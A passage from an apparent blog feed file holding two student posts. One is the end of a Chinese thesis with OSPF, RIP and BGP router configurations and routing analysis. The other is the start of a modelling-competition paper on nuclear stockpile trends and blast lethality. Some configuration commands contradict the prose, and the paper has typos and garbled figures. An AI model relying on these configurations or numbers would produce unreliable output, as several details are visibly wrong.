class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>AR5、AR6、AR7配置OSPF，Router ID为环回接口0的IP地址，AR6的GigabitEthernet 0/0/0接口与AR7的GigabitEthernet 0/0/2接口运行在区域0中，AR6的GigabitEthernet 0/0/1接口与AR5的GigabitEthernet 0/0/1接口运行在区域1中，AR7的GigabitEthernet 0/0/1接口与AR5的GigabitEthernet 0/0/0接口运行在区域2中，AR7的GigabitEthernet 0/0/0接口与AR5的GigabitEthernet 0/0/2接口运行在区域4中。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#在AR5、AR6、AR7配置命令如下。</span><span class="token namespace">[AR5]</span>ospf 1<span class="token namespace">[AR5-ospf-1]</span>area 1<span class="token namespace">[AR5-ospf-1-area-0.0.0.1]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>5<span class="token punctuation">.</span>5 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR5-ospf-1-area-0.0.0.1]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>56<span class="token punctuation">.</span>5 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR5-ospf-1-area-0.0.0.1]</span>quit<span class="token namespace">[AR5-ospf-1]</span>area 2<span class="token namespace">[AR5-ospf-1-area-0.0.0.2]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>57<span class="token punctuation">.</span>5 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR5-ospf-1-area-0.0.0.2]</span>quit<span class="token namespace">[AR5-ospf-1]</span>area 4<span class="token namespace">[AR5-ospf-1-area-0.0.0.4]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>10<span class="token punctuation">.</span>5 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR6-ospf-1]</span>area 0<span class="token namespace">[AR6-ospf-1-area-0.0.0.0]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>6<span class="token punctuation">.</span>6 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR6-ospf-1-area-0.0.0.0]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>67<span class="token punctuation">.</span>6 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR6-ospf-1-area-0.0.0.0]</span>quit<span class="token namespace">[AR6-ospf-1]</span>area 1<span class="token namespace">[AR6-ospf-1-area-0.0.0.1]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>56<span class="token punctuation">.</span>6 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR7-ospf-1]</span>area 0<span class="token namespace">[AR7-ospf-1-area-0.0.0.0]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>67<span class="token punctuation">.</span>7 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR7-ospf-1-area-0.0.0.0]</span>quit<span class="token namespace">[AR7-ospf-1]</span>area 2<span class="token namespace">[AR7-ospf-1-area-0.0.0.2]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7<span class="token punctuation">.</span>7 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR7-ospf-1-area-0.0.0.2]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>57<span class="token punctuation">.</span>7 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR7-ospf-1-area-0.0.0.2]</span>quit<span class="token namespace">[AR7-ospf-1]</span>area 4<span class="token namespace">[AR7-ospf-1-area-0.0.0.4]</span>network 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>10<span class="token punctuation">.</span>7 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在AR8、AR9、AR10配置RIP协议，为了节省链路带宽，在非相关端口不发送接收RIP报文</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#在AR8、AR9、AR10配置命令如下</span><span class="token namespace">[AR8]</span>rip 1<span class="token namespace">[AR8-rip-1]</span>network 10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR8]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>2<span class="token namespace">[AR8-GigabitEthernet0/0/2]</span>undo rip output<span class="token namespace">[AR8-GigabitEthernet0/0/2]</span>undo rip input<span class="token namespace">[AR9]</span>rip 1<span class="token namespace">[AR9-rip-1]</span>network 10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR9]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR9-GigabitEthernet0/0/1]</span>undo rip output<span class="token namespace">[AR9-GigabitEthernet0/0/1]</span>undo rip input<span class="token namespace">[AR10]</span>rip 1<span class="token namespace">[AR10-rip-1]</span>network 10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token namespace">[AR10]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>0<span class="token namespace">[AR10-GigabitEthernet0/0/0]</span>undo rip output<span class="token namespace">[AR10-GigabitEthernet0/0/0]</span>undo rip input<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>AR1与AR3建立IBGP邻居，AR1与AR6建立EBGP邻居，AR3与AR10建立EBGP邻居。在AR6上BGP与OSPF互相引入，在AR10上BGP与IS-IS互相引入，在AR1与AR3上将BGP引入IS-IS中。</p></blockquote><p>在AR1、AR3、AR6、AR10上配置命令如下。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[AR1]</span>bgp 100<span class="token namespace">[AR1-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3<span class="token punctuation">.</span>3 as<span class="token operator">-</span>number 100<span class="token namespace">[AR1-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3<span class="token punctuation">.</span>3 <span class="token function">connect-interface</span> LoopBack0<span class="token namespace">[AR1-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3<span class="token punctuation">.</span>3 next<span class="token operator">-</span>hop<span class="token operator">-</span>local<span class="token namespace">[AR1-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>16<span class="token punctuation">.</span>6 as<span class="token operator">-</span>number 10<span class="token namespace">[AR1]</span>IS<span class="token operator">-IS</span> 1<span class="token namespace">[AR1-IS-IS-1]</span><span class="token function">import-route</span> bgp<span class="token namespace">[AR3]</span>bgp 100<span class="token namespace">[AR3-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 as<span class="token operator">-</span>number 100<span class="token namespace">[AR3-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 <span class="token function">connect-interface</span> LoopBack0<span class="token namespace">[AR3-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 next<span class="token operator">-</span>hop<span class="token operator">-</span>local<span class="token namespace">[AR3-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>103<span class="token punctuation">.</span>10 as<span class="token operator">-</span>number 20<span class="token namespace">[AR3]</span>IS<span class="token operator">-IS</span> 1<span class="token namespace">[AR3-IS-IS-1]</span><span class="token function">import-route</span> bgp<span class="token namespace">[AR6]</span>bgp 10<span class="token namespace">[AR6-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>16<span class="token punctuation">.</span>1 as<span class="token operator">-</span>number 100<span class="token namespace">[AR6-bgp]</span><span class="token function">import-route</span> ospf<span class="token namespace">[AR6]</span>ospf 1<span class="token namespace">[AR6-ospf-1]</span><span class="token function">import-route</span> bgp<span class="token namespace">[AR10]</span>bgp 20<span class="token namespace">[AR10-bgp]</span>peer 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>103<span class="token punctuation">.</span>3 as<span class="token operator">-</span>number 100<span class="token namespace">[AR10-bgp]</span><span class="token function">import-route</span> ospf<span class="token namespace">[AR10]</span>ospf 1<span class="token namespace">[AR10-ospf-1]</span><span class="token function">import-route</span> bgp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-5-工程分析">4.5 工程分析</h4><p>首先，分析该工程二层环境下MSTP的防环机制。在SW1上G 0/0/2被选举为指定端口，G 0/0/3被选举为根端口，如图4-1所示。在SW2上G 0/0/2被选举为备份端口，G 0/0/3被选举为根端口，如图4-2所示。在SW3上G 0/0/1与G 0/0/2被选举为指定端口，如图4-3所示。流量在二层网络环境中，会由SW3传给SW1传给R7，或由SW3传给SW2传给R5，在二层环境下不存在环路。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\SW1端口情况.jpg" style="zoom:80%;" /><center>图4-1 SW1端口情况</center><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\SW2端口情况.jpg" style="zoom:80%;" /><center>图4-2 SW2端口情况</center><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\SW3端口情况.jpg" style="zoom:80%;" /><center>图4-3 SW3端口情况</center><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\AR8部分路由表.jpg" style="zoom: 80%;" /><center>图4-4 AR8部分路由表</center><p>接下来，分析流量的走向问题。PC1、PC2与PC3、PC4可以互相访问，Client2可以访问Server1服务器。先分析路由的传递过程，AR7上有APC1的路由信息，通过同步OSPF的LSDB将路由信息传递给AR5与AR6。AR6与AR1建立了EBGP邻居，并且OSPF被引入到BGP中，AR1会收到AR6通过EBGP邻居传递给他的关于PC1的路由信息。AR1收到后会传递给他的IBGP邻居AR3，AR3与AR10建立EBGP邻居，且去往这些BGP路由的下一跳地址可达（在配置中AR3由AR1收到的BGP路由下一跳为AR1的环回接口），BGP同步关闭，AR3会将这些BGP路由传递给AR10，在AR10上，BGP被引入到RIP中， AR8会收到关于PC1网段的路由信息，如图4-4所示。</p><p>另一方向AR8上拥有PC3的IP地址路由信息，通过RIP协议，同步给AR10、AR9。AR10与AR3建立BGP邻居，并且RIP路由信息被引入到BGP中，所以AR10会将关于PC3的路由信息传递给AR3，AR3收到后会传递给他的IBGP邻居AR1，AR1与AR6建立EBGP邻居，且去往这些BGP路由的下一跳地址可达（在配置中AR1由AR3收到的BGP路由下一跳为AR3的环回接口），BGP同步关闭， AR1会将这些BGP路由传递给AR6，AR6上BGP被引入到OSPF中， AR5、AR7可以收到关于PC3的路由信息，如图4-5所示。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\AR7部分路由表.jpg" style="zoom:80%;" /><center>图4-5 AR7部分路由表</center><p>在运营商网络环境中，当AR3从他的IBGP邻居收到路由信息后，首先判断去往这条路由的下一跳是否可达，在判断BGP是否同步，如果满足两项要求，路由器才会将路由信息传递给他的EBGP邻居，在工程环境中，运营商与公司之间不会建立任何IGP邻居，AR3收到的路由条目下一跳不可达，需将它的下一跳修改为AR1的环回接口，来保证下一条可达。BGP同步是指BGP收到的路由在他的IGP路由表中也要有这条路由，路由器才会将路由传递。需将BGP路由引入到IS-IS中，这样保证了BGP同步。但是，运营商网络不需要接收公司的路由，如果我们将所有BGP路由全部引入到IGP中，运营商会接收到大量的不需要的路由，IGP的承载能力有限，有可能会导致网络的崩溃。在搭建的网络环境中，可以选择将BGP同步关闭。来将路由传递过去，有可能会导致数据的黑洞。可以使用反射器和联盟技术，将涉及的路由器全互联，消除数据黑洞。</p><h4 id="4-6-工程优化">4.6 工程优化</h4><p>本工程中，运营商要求在内部网络内，只有AR3与AR1建立BGP邻居，其他路由器不建立任何BGP邻居。因为BGP同步的原因，需要在AR3与AR1上将BGP路由引入到IS-IS内，来解决出现的数据黑洞问题。这样又导致了运营商内部IS-IS网络接收到了大量自己并不需要的路由，IS-IS承载路由能力有限，如果有多家公司采用这种方式，有可能会导致网络的崩溃。</p><p>首先，分析数据黑洞产生的原因。如果关闭路由器BGP同步功能，在AR1与AR3上不将BGP路由引入到IS-IS中。当AR3收到去往PC1（10.1.10.0网段）的数据包时候，为了保证下一跳可达，AR1与AR3相互通告的路由信息下一跳地址都为自己环回接口，当AR3查询路由表时，去往10.1.10.0网段下一跳为10.1.1.1（AR1环回接口），出接口为Gigabit Ethernet 0/0/1与Gigabit Ethernet 0/0/2接口，如图4-6所示。数据包会交给AR2或者AR4，AR2与AR4不参与BGP，在AR2与AR4路由表中没有关于10.1.10.0网段的信息，如图4-7所示，数据包会被丢弃，由此导致了数据黑洞的产生。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\AR3部分路由表.jpg" style="zoom:80%;" /><center>图4-6 AR3部分路由表</center><p>如果解决在AR2与AR4上路由的问题，在AR2与AR4接收到AR3发往10.1.10.0网段的数据包时，会将此数据包交给AR1，则问题解决。在MPLS VPN技术中，MPLS BGP与LDP会给数据流量分配内层外层标签。如果将此技术引用到IS-IS中，IS-IS支持TLV字段，定义IS-IS中TLV字段，在TLV中写入外层目的地址，当路由器收到数据包时，首先查看外层IP地址，如果在路由表中，有关于外层目的地址的路由信息，则将数据包传递，如果在路由表中没有关于外层目的地址信息，在查看内部IP地址转发。当路由器收到TLV字段中外层目的IP地址为本路由器上某接口IP地址时，直接查看内部IP地址进行转发。</p><p>在IS-IS内通过命令引入路由信息时，定义一类路由信息，此类路由信息引入到IS-IS中后，可以配置此类路由信息的外层IP地址，此类路由信息也不会向其他IS-IS邻居传递此类路由。通过外层目的IP地址将数据包交给网络中了解内层目的IP地址的路由器，沿途路由器只需要拥有去往外层目的IP地址的路由信息，不需要关心内部目的IP地址。避免网络中路由器资源的浪费，缩减网络中路由器路由表。当然如果采用这种设计，需要要求所有路由器都要识别此TLV字段，如果中途路由器不识别，也有可能产生路由黑洞。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\AR2路由表.jpg" alt="img" style="zoom:80%;" /><center>图4-7 AR2路由表</center><p>在此工程中，使用此TLV字段，在AR3上将BGP引入到IS-IS中，定义引入的路由，这些路由不会传递给AR3其他IS-IS邻居，在数据包传递中，加入相应TLV字段，写入外层目的IP地址为10.1.1.1，AR2或AR4收到数据包，根据外层目的IP地址，查询自己路由表，将此数据包交给AR1，消除了路由黑洞，也保证了网络中不会接收到不需要的路由信息。</p><h3 id="5-总结">5 总结</h3><p>本文介绍了现有网络环境中主要通讯设备与设备之间运行的协议，并利用各种网络协议实现了高效的网络互联。从工程实施和分析过程中可以看出，STP技术通常应用在网络的二层环境，用来防止网络风暴。同时，也分析了OSPF与IS-IS邻居建立机制，部署OSPF为企业业务网络提供连通性，并采用BGP在不同机构间传递路由表，降低了路由表规模，增强了网络的可靠性，提升了网络的利用率。仿真实验和工程分析表明，本文采用的技术是合理的和有效的。网络规模的扩大化对网络互联设备与网络协议的要求越来越高，技术与信息的发展，都会对现有网络互联结构产生冲击，作为良好的网络工程设计，需要深入了解现有网络设备，更深层次的实施现有网络协议，避免数据风暴路由、路由黑洞和路由环路的产生，并提升网络资源的利用率。也需要考虑到未来的发展趋势，为工程实施留足未来弹性，从而全面推动网络技术的向前发展。</p><h3 id="参考文献">参考文献</h3><p>[1] 别碧勇. IS-IS路由协议及其在IP网络工程设计中的应用[J]．铁道勘测与设计, 2006(1):47-53.</p><p>[2] 汪孝宜，刘中兵．MVC技术在ASP.NET中的应用[J]．计算机应用，2012，23(6)：212-215．</p><p>[3] 李妍星．DNS安全扩展与可扩展分布式DNS研究[D]．四川：电子科技大学，2022：51-62．</p><p>[4] 章全．计算机网络原理与应用[M] ．南京：南京大学出版社，2019：135-164．</p><p>[5] 严斌宇, 卢苇, 黄锐. OSPF路由选择协议的研究[J]. 四川大学学报自然科学版, 2002, 39(3):460-464.</p><p>[6] 邵兵, 李越鹏, 赵保华. OSPF协议性能测试的研究与实践[J]. 计算机应用, 2003, 23(10): 62-63.</p><p>[7] 吕俏, 刘启文, 石冰心. STP协议原理的算法与实现[J]. 华中科技大学学报自然科学版, 2000, 28(1): 65-67.</p><p>[8] 袁展. 基于Boson NetSim的小型网络虚拟实现[J]. 现代电子技术, 2007, 30(7):89-91.</p><p>[9] 王震宇, 马晓军, 蒋烈辉. STP协议与生成树设计优化[J]. 信息工程大学学报, 2003, 4(1): 66-68.</p><p>[10] 魏立津, 左丞. 基于IS-IS协议的大型IP网络路由规划与设计分析[J]. 硅谷, 2014(6): 50-51.</p><p>[11] 陈杰. 电力通信数据网IGP协议弃OSPF选IS-IS原因分析[J]. 信息通信, 2016(6) :169-170.</p><p>[12] B.Fortz,M.Thorup. Robust Optimization of OSPF/IS-IS Weights[J].Statistics in Medicine,2014,27(22):4515-31.</p><p>[14] A. Cianfrani, V. Eramo, M. Listanti, et al. An Energy Saving Routing Algorithm for a Green OSPF Protocol[C]. IEEE International Conference on Computer Communications (INFOCOM), 2015:1-5.</p><p>[15] J. Rodríguez, S. Fernandez, I. Sanz, et al. Distributed Approach for Smart Grids  Reconfiguration Based on the OSPF Routing Protocol[J]. IEEE Transactions on Industrial   Informatics, 2016, 12(2):864-871.</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 毕业论文 </tag>
            
            <tag> MSTP </tag>
            
            <tag> OSPF </tag>
            
            <tag> IS-IS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年美赛数学建模</title>
      <link href="/2024/03/31/2022%E5%B9%B4%E7%BE%8E%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
      <url>/2024/03/31/2022%E5%B9%B4%E7%BE%8E%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-APMCM-summary-sheet"><a href="#2022-APMCM-summary-sheet" class="headerlink" title="2022 APMCM summary sheet"></a>2022 APMCM summary sheet</h1><p>​        Because of the terrible power of nuclear weapons, many countries hope to use it to deter other countries and protect themselves from foreign invasion. Based on nuclear weapons  development data of various countries over the years, this paper analyzes and predicts the  change trend of nuclear weapons in the future, and establishes the lethality model to calculate  the destructive capability of nuclear weapons. The following analysis is carried out for each  problem. </p><p>​        For the first problem, firstly, the data is preprocessed, and the obtained data is drawn into  line charts and bar charts for descriptive analysis and visual analysis. Then, the entropy weight  method is used to calculate the weights of the variables of status, tests and stockpile, which are  0.0422,0.9198 and 0.0380, respectively. The country that is most active in nuclear weapons  research is calculated according to the weights obtained. </p><p>​        For the second problem, first of all, the number of nuclear weapons in the whole country  is obtained through data processing. Then, the relationship between the storage number and the year is found by fitting. After repeated adjustment, the coefficient of determination of each  fitting result is no less than 0.8, and the relationship between the year and the number of  nuclear weapons of each country and the whole world is obtained. The fitting model is  established to predict the number of nuclear weapons. In order to increase the accuracy of the  prediction results, the ARIMA(p, d, q) prediction model is established to predict the number of  nuclear weapons in the future and the countries that may possess nuclear weapons in the  future. Due to the international situation, it is understood that South Africa has voluntarily given up the development of nuclear weapons, so the forecast data does not include South  Africa. </p><p>​        For the third problem, the lethal model of the detonation location of nuclear weapons is  first established, which is described from two aspects: the killing power of blast wave and the  degree of nuclear radiation damage. The effective killing distance and area are calculated  according to the nuclear bomb killing formula, and the blast shock wave overpressure peak  value is calculated by using the empirical formula of spherical charge explosion in infinite air  medium. The killing radius corresponding to different impact damage levels is obtained and  the explosion wave power model is established. The degree of nuclear radiation damage mainly depends on the sum of neutron and γ radiation dose absorbed by human body. Then,  the model is used to calculate the damage range of “Big Ivan” nuclear bomb with 100  megabytes of THT equivalent and the number of destroyed earth. It can be seen that the  number of existing nuclear bombs cannot destroy the earth. Finally, taking 10% of land damage as the limit of total nuclear warheads, the number of nuclear warheads destroyed by a  large country is taken as the maximum number of nuclear warheads possessed by a nuclear  country. </p><p><strong>Key words</strong>: entropy weight method, fitting, time series model</p><h1><center>Contents </center></h1>[TOC]<h2 id="1-Problem-background-and-restatement"><a href="#1-Problem-background-and-restatement" class="headerlink" title="1 Problem background and restatement"></a>1 Problem background and restatement</h2><h3 id="1-1-Problem-background"><a href="#1-1-Problem-background" class="headerlink" title="1.1 Problem background"></a>1.1 Problem background</h3><p>​        Nuclear weapon refers to the huge deadly weapons related to nuclear reaction, including  hydrogen bomb, atomic bomb, neutron bomb, etc. It is one of the most powerful weapons  developed by human beings and has a terrible power. Therefore, many countries hope to use it  to deter other countries and protect their own countries from foreign invasion. After World  War II, all countries in the world began to frantically develop and manufacture atomic bombs,  “Big Ivan” is now the world’s known most powerful nuclear bomb. Many people believe that  nuclear weapons can destroy the Earth many times over by affecting the living conditions of  human beings on Earth. </p><h3 id="1-2-Problem-restatement"><a href="#1-2-Problem-restatement" class="headerlink" title="1.2 Problem restatement"></a>1.2 Problem restatement</h3><p>​        Based on the above background, and on the basis of collecting data on nuclear weapons  development, research and development attitudes and policies of various countries over the  past years, the following questions are answered. </p><ol><li>A mathematical model is established and the relevant data are used for quantitative  analysis to identify the countries that possess nuclear weapons, the countries that have reduced  or increased their stockpiles the most in the past 20 years, the five years in which nuclear  weapons tests have occurred the most, the countries that have been the most active in nuclear  weapons research in the past decade, and the countries that have made the fastest transition  from “no consideration of nuclear weapons” to “possession of nuclear weapons”. </li><li> To build a mathematical model to predict the number of nuclear weapons, predict the  next 100 years of nuclear weapon states and the number of nuclear weapons, the total number  of nuclear weapons in 2123, the number of nuclear weapons in each country to change trends. </li><li>To build a mathematical model of the detonation location of nuclear weapons and  calculate the maximum destructive power of nuclear weapons. Estimate the minimum number  of nuclear bombsthat could destroy the planet, and determine whether the current total number  of nuclear bombs could destroy the planet. To protect the planet and the environment on which  we live, set limits on the total number of nuclear bombs in the world and the number of nuclear  bombs by nuclear states. </li></ol><h2 id="2-Problem-analysis"><a href="#2-Problem-analysis" class="headerlink" title="2 Problem analysis"></a>2 Problem analysis</h2><h3 id="2-1-Problem-one-analysis"><a href="#2-1-Problem-one-analysis" class="headerlink" title="2.1 Problem one analysis"></a>2.1 Problem one analysis</h3><p>​        According to the four tables of data on nuclear weapons of each country given in the  annex of the title, the change of each country’s position on nuclear weapons is analyzed. By  studying the stockpiles of nuclear warheads of each country in the past 78 years and comparing  the changes of nuclear warhead stockpiles of 10countries, the bar chart of the world’s annual  nuclear weapons tests in the past 78 years is drawn. And draw a broken line chart showing the  changing positions of countries that once possessed nuclear weapons on nuclear weapons.The  attachment data is preprocessed, the data in the form is analyzed by entropy weight method,and the status of each country, the number of tests, and the weight of stockpile changes are  calculated. </p><h3 id="2-2-Problem-two-analysis"><a href="#2-2-Problem-two-analysis" class="headerlink" title="2.2 Problem two analysis"></a>2.2 Problem two analysis</h3><p>​        The nuclear weapon reserves of the countries in the annex have been indicated in each  year, so it is necessary to predict the number of nuclear weapons in the future. The  establishment of a prediction model to calculate the number of nuclear weapons in a future  year according to the existing historical data belongsto the prediction problem. Due to the large  number of countries, it is particularly important to extract the relationship between the number  of nuclear weapons in each country and the year. Since the storage capacity changes with time,  the time series model is chosen here to predict the future storage capacity. </p><h3 id="2-3-Problem-three-analysis"><a href="#2-3-Problem-three-analysis" class="headerlink" title="2.3 Problem three analysis"></a>2.3 Problem three analysis</h3><p>​        In view of problem 3, firstly, the establishment of the lethal model of the detonation  location: firstly, we can directly establish the explosive wave power model from the power of  nuclear explosion itself, considering the effective killing range (area)generated by the shock  wave, the heat energy released and the peak overpressure of the explosion wave; Secondly, the  killing power of nuclear weapons can be described indirectly from the damage degree of  nuclear radiation to human body and environment. In a nuclear explosion, a large number of  neutrons and γ radiation are released, and the damage of nuclear radiation to human body  mainly depends on the sum of the neutrons and γ radiation absorbed. </p><p>​        Then, as for the choice of the TNT equivalent of nuclear bomb, considering the large  energy needed to destroy the earth, we chose “Big Ivan”, the largest TNT equivalent of  100M.Finally, in terms of the limitation of nuclear warheads, according to the data, it is  impossible to achieve zero nuclear warheads, so we can only choose to reduce the damage of  nuclear explosions to the earth and reduce the total number of nuclear warheads, and we  choose 10% of the land destruction area. For nuclear states, the role of nuclear bombs in  safeguarding national security should be considered. Therefore, the number of nuclear warheads destroyed by a large country is taken as the maximum number of nuclear warheads  possessed by a nuclear state. </p><h3 id="3-Problem-hypothesis"><a href="#3-Problem-hypothesis" class="headerlink" title="3 Problem hypothesis"></a>3 Problem hypothesis</h3><ol><li>Assume that all nuclear bombs in the world have a TNT equivalent of 100Mt. </li><li>Assume that the detonation of a nuclear bomb is instantaneous, disregarding the nuclear reaction process of the explosion. </li><li>Assume that the energy from a nuclear bomb explosion is all expressed in the form of  a shock wave and travels in a straight line. </li><li>Assume that the kill power of multiple nuclear bombs is equal to the sum of TNT  equivalent. </li><li>Assume that the nuclear explosion is a ground nuclear explosion, and the damage to the ground explosion is close to a circle. </li><li>Assume that the air density is standard air density 1.29kg/m. </li></ol><h2 id="4-Symbol-description"><a href="#4-Symbol-description" class="headerlink" title="4 Symbol description"></a>4 Symbol description</h2><p>​        In order to facilitate reading and understanding, the paper gives a unified explanation of  important variables, as shown in Tab. 4-1. </p><center>Tab.4-1 Symbol description </center>| Symbol | Description                  | Symbol | Description                     || ------ | ---------------------------- | ------ | ------------------------------- || SST    | Sum of the total squares     | p      | Regression term coefficients    || SSE    | Regression to sum of squares | q      | Sliding average number of items || SSR    | Sum of squared errors        | d      | Number of differences           |<h2 id="5-Model-and-solution-of-problem-one"><a href="#5-Model-and-solution-of-problem-one" class="headerlink" title="5 Model and solution of problem one"></a>5 Model and solution of problem one</h2><h3 id="5-1-a-preprocessing"><a href="#5-1-a-preprocessing" class="headerlink" title="5.1 a preprocessing"></a>5.1 a preprocessing</h3><p>​        For problem 1, first of all, check the data in the attachment, and use matlab programming  to check the following data anomalies: </p><ol><li>Whether there is a missing value; </li><li>Import the data into matlab to check for the presence of NaNso, to determine whether there are outliers. </li><li>Use the unique function to check and weed out a large number of duplicate values. After  calculation, there are no missing values, outliers, duplicate values in the attachment. </li></ol><h3 id="5-2-Descriptive-statistical-analysis"><a href="#5-2-Descriptive-statistical-analysis" class="headerlink" title="5.2 Descriptive statistical analysis"></a>5.2 Descriptive statistical analysis</h3><p>​        Question a requires to analyze the position form in the attachment of the topic, and summarize the data according to Status, 0 is none, l is Consideration, 2 is Pursuit, 3 is  Possession, and the conclusion can be reached: Russia, the United States, China, France, the  United Kingdom, Pakistan, India, Israel, North Korea and South Africa once possessed nuclear weapons. </p><p>​        According to question b, analyze the form in the attachment to obtain Tab.5-1.Nuclear  weapons change line Fig.5-1 is obtained by using matlab to draw according to data in form  Stockpiles. According to Tab.5-1 and Fig.5-1, it can be concluded that in the past 20 years,  nuclear weapons stockpile of United States has changed the most. The stockpile has decreased  by 6749. </p><center>Tab.5-1 Table of relative and absolute changesin estimated nuclear warhead stockpiles over the  past 20 years </center>| Country        | 2002      | 2022     | Absolute Change | Relative Change || -------------- | --------- | -------- | --------------- | --------------- || United States  | 10,457.00 | 3,708.00 | -6,749.00       | -65%            || Russia         | 10,114.00 | 4,477.00 | -5,637.00       | -56%            || United Kingdom | 280.00    | 180.00   | -100.00         | -36%            || France         | 350.00    | 290.00   | -60.00          | -17%            || South Africa   | 0.00      | 0.00     | +0.00           |                 || Israel         | 76.00     | 90.00    | 14.00           | +18%            || North Korea    | 0.00      | 20.00    | +20.00          |                 || China          | 235.00    | 350.00   | +115.00         | +49%            || India          | 23.00     | 160.00   | +137.00         | +596%           || Pakistan       | 26.00     | 165.00   | +139.00         | +535%           |<img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Nuclear weapons change line graph.png" style="zoom:50%;" /><center>Fig.5-1 Nuclear weapons change line graph </center>​        To solve question c, to analyze the data of the form Tests attached to the question and get  the number of nuclear weapons experiments conducted in the world every year. In order to get  the conclusion intuitively, the bar graph is drawn and the graph of the number of nuclear  weapons experiments from 1945 to 2019 is obtained. It can be concluded that in 1962, 1958,  1968, 1966, 1966 and 19615, nuclear weapon tests occurred the most, 178 times, 116 times, 79  times, 76 times and 71 times respectively. <img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/The graph of the number of nuclear weapon tests from 1945 to 